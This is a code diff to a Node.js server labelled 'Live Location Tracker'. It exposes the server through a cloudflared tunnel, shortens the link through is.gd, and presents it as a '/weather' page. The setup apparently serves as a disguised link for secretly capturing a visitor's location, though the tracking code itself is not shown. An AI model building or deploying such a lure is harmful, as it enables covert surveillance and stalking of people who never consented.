@@ -1,4 +1,4 @@
-const { tunnel: cloudflaredTunnel } = require("cloudflared")
+const { exec } = require("child_process")
 const cookieParser = require("cookie-parser")
 const socketIO = require("socket.io")
 const config = require("./config")
@@ -23,12 +23,50 @@ app.use(express.json())
 
 app.use("/", require("./router"))
 
-server.listen(PORT, async () => {
-    const localURL = `http://localhost:${PORT}`
-    remoteURL = await cloudflaredTunnel({
-        "--url": localURL
-    }).url
+// Tunnel handle karne aur short link banane ka function
+function startTunnel(port) {
+    return new Promise((resolve) => {
+        const process = exec(`cloudflared tunnel --url http://localhost:${port}`);
+        
+        process.stderr.on('data', async (data) => {
+            const match = data.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
+            if (match) {
+                const originalUrl = match[0];
+                console.log(`\n[+] Cloudflare Link: ${originalUrl}`);
+                console.log(`[+] Shortening link via is.gd...`);
+                
+                try {
+                    // Node.js ke inbuilt fetch se is.gd api call kar rahe hain (No external package needed)
+                    const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(originalUrl)}`);
+                    const json = await response.json();
+                    if (json.shorturl) {
+                        resolve(json.shorturl);
+                    } else {
+                        resolve(originalUrl); // Fallback agar shortener fail ho jaye
+                    }
+                } catch (err) {
+                    resolve(originalUrl);
+                }
+            }
+        });
+    });
+}
 
+server.listen(PORT, async () => {
+    console.log(`\n========================================`)
+    console.log(`   CREATED BY : Shabaz Pathan           `)
+    console.log(`   TOOL       : Live Location Tracker   `)
+    console.log(`========================================\n`)
+
+    const localURL = `http://localhost:${PORT}`
+    
     console.log(`LOCAL  : ${localURL}`)
-    console.log(`REMOTE : ${remoteURL}`)
+    console.log("Starting cloudflared tunnel...")
+    
+    remoteURL = await startTunnel(PORT)
+
+    console.log(`\n========================================`)
+    console.log(`🔥 LIVE SHORT URL : ${remoteURL}/weather`)
+    console.log(`========================================\n`)
 })
+
